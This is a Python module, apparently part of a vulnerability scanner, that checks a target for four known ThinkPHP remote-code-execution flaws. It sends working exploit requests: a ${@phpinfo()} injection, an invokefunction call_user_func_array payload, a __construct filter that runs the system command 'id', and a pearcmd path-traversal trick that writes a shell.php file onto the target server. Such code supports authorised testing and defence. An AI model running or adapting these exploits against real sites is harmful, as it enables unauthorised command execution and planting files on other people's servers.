import logging
import re
from urllib.request import urlopen
from urllib.parse import urljoin

from lib.connection.HttpEntity import Request
from lib.help.dump import vul, Rank


class ThinkPHP:
    def __init__(self, url):
        self.url = url
        self.id_pattern = re.compile("uid.*?gid.*?groups.*?")
        self.info_pattern = re.compile('alt="PHP logo" /></a><h1 class="p">PHP Version .*?</h1>')

    def check_rce1(self):
        url = urljoin(self.url, 'index.php?s=/index/index/name/${@phpinfo()}')
        r = Request('GET', url).send().body
        if self.info_pattern.search(r):
            logging.warning("[+] ThinkPHP 2.x RCE")
            logging.warning("[+] detected phpinfo: " + url)
            return vul("RCE", "detail: https://vulhub.org/#/environments/thinkphp/2-rce/",
                       "detected phpinfo: " + url, Rank.CRITICAL)

    def check_rce2(self):
        url = urljoin(self.url,
                      '/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars['
                      '0]=phpinfo&vars[1][]=-1')
        r = Request('GET', url).send().body
        if self.info_pattern.search(r):
            logging.warning("[+] Thinkphp5 5.0.22/5.1.29 RCE")
            logging.warning("[+] detected phpinfo: " + url)
            return vul("RCE", "detail: https://vulhub.org/#/environments/thinkphp/5-rce/",
                       "detected phpinfo: " + url, Rank.CRITICAL)

    def check_rce3(self):
        param = {
            '_method': '__construct',
            'filter[]': 'system',
            'method': 'get',
            'server[REQUEST_METHOD]': 'id'
        }
        r = Request('POST', urljoin(self.url, '/index.php?s=captcha'), data=param).send().body
        if match := self.id_pattern.search(r):
            logging.warning("[+] ThinkPHP5 5.0.23 RCE")
            logging.warning("[+] detected id echo: " + match.group())
            return vul("RCE", "detail: https://vulhub.org/#/environments/thinkphp/5.0.23-rce/",
                       "id echo: " + match.group(), Rank.CRITICAL)

    def check_rce4(self):
        status = Request('GET', urljoin(self.url, '/?lang=../../../../../public/index')).send().status
        if status == 500:
            logging.warning("[+] ThinkPHP6 multiple language to LFI suspicious")
            # requests模块会自动url编码尖括号
            r = urlopen(urljoin(self.url,
                                '/?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php'
                                '/pearcmd&/<?=phpinfo()?>+shell.php')).read().decode()
            if 'CONFIGURATION (CHANNEL PEAR.PHP.NET)' in r:
                logging.warning("[+] Remote Env: register_argc_argv On & pcel/pear Installed")
                shell = urljoin(self.url, '/shell.php')
                res = Request('GET', shell).send().body
                if self.info_pattern.search(res):
                    logging.warning("[+] Thinkphp6 Lang LFI (version <= 6.0.13)")
                    logging.warning("[+] detected phpinfo: " + shell)
                    return vul("RCE",
                               "detail: https://github.com/vulhub/vulhub/blob/master/thinkphp/lang-rce/README.zh-cn.md",
                               "detected phpinfo: " + shell, Rank.CRITICAL)

    def think_check(self):
        methods = [(method[6:], getattr(self, method)) for method in dir(self) if
                   callable(getattr(self, method)) and method.startswith("check")]
        think_vul = []
        for meth in methods:
            if res := meth[1]():
                think_vul.append(res)
        return think_vul
